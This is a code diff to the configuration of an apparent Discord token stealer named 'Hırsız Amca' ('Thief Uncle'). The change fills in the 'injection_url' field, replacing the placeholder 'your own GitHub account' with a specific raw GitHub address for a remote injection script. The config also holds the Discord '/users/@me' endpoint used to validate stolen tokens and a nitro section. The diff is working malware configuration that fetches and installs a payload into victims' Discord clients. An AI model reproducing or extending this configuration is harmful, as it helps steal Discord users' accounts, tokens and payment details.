@@ -14,9 +14,9 @@ const config = {
   embed_name: 'Hırsız Amca V0.1', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1207510995719946280/1207511071360024637/cs.png?ex=65dfe951&is=65cd7451&hm=0183c55133c40f36798268f2caccf495e5dab1a736bbfee876e4e1e2d1951dc2&'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/KENDİ GİTHUB HESABIN/index/main/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/SawRag/abcdefgabosbababosbudunyabosaq/main/allahinaslanlari.js', 
   /**
-   
+   SawRag/abcdefgabosbababosbudunyabosaq/blob/main/allahinaslanlari.js
    **/
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
